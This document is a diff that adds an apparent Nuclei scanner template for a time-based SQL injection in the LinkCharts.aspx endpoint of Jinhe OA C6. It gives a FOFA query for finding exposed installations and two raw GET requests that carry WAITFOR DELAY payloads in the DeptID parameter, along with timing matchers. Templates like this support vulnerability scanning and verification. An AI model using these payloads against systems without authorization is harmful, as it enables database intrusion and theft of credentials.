@@ -1,0 +1,23 @@
+id: jinhe-oa-linkcharts-aspx-sql-injection
+info:
+  name: 金和OA LinkCharts.aspx 接口存在SQL注入风险
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+    金和网络提供的协同OA系统C6版本中，LinkCharts.aspx接口存在SQL注入缺陷。攻击者可利用此漏洞执行恶意SQL语句，导致数据库敏感数据泄露，包括管理员账号及用户隐私信息。在具备特定权限的情况下，该注入点可能被用于进一步攻击，如写入恶意文件，从而获取服务器控制权。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    GET /c6/JHSoft.Web.CrmWorkFlat/LinkCharts.aspx/?DeptID=1%27waitfor%20delay%270%3A0%3A5%27-- HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /c6/JHSoft.Web.CrmWorkFlat/LinkCharts.aspx/?DeptID=1%27waitfor%20delay%270%3A0%3A8%27-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
